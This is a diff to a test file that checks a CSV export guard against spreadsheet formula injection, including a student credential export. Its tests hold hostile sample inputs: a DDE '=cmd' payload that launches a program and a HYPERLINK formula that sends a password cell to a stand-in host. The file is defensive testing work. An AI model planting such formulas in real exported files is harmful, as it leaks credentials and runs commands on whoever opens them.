@@ -9,6 +9,12 @@ import { toCsvBody, toCsvRow } from "@/lib/csv";
  * can run DDE commands or leak data via a crafted HYPERLINK/WEBSERVICE call.
  * Every export route in this app builds rows through these two functions —
  * testing them here covers every route at once.
+ *
+ * "Every export" now genuinely means every one. Two client-side downloads
+ * quoted their cells but never neutralised formulas, and quoting does not
+ * help: a spreadsheet still evaluates ="..." inside a quoted field. One of
+ * them was the credential file — display name, username, PASSWORD — where
+ * the display name is supplied by whoever enrols the student.
  */
 describe("toCsvRow — formula-injection neutralization", () => {
   it.each([
@@ -70,5 +76,31 @@ describe("toCsvBody — full document assembly", () => {
     const lines = body.trim().split("\r\n");
     expect(lines[1]).toBe("'=cmd|'/C calc'!A1,50");
     expect(lines[1]).not.toMatch(/^=cmd/);
+  });
+});
+
+describe("the guard covers the values these exports actually carry", () => {
+  it("neutralises a hostile display name in the credential export", () => {
+    // The realistic attack: a student is enrolled with a formula for a name,
+    // and the admin opens the credential CSV in Excel.
+    const row = toCsvRow([
+      '=HYPERLINK("http://example.invalid?p="&C2,"Click")',
+      "hop",
+      "apple-bunny-42",
+    ]);
+    expect(row.startsWith("\"'=HYPERLINK")).toBe(true);
+    // The password still round-trips unchanged — the guard must not corrupt
+    // the one value the file exists to deliver.
+    expect(row.endsWith("apple-bunny-42")).toBe(true);
+  });
+
+  it("still quotes and escapes ordinary values", () => {
+    expect(toCsvRow(['Ali, "Bear"', "ali", "pass"])).toBe('"Ali, ""Bear""",ali,pass');
+  });
+
+  it("leaves a name that merely CONTAINS an operator alone", () => {
+    // Only a LEADING operator is dangerous; prefixing every hyphenated name
+    // would corrupt real data for no security gain.
+    expect(toCsvRow(["Al-Mansoori"])).toBe("Al-Mansoori");
   });
 });
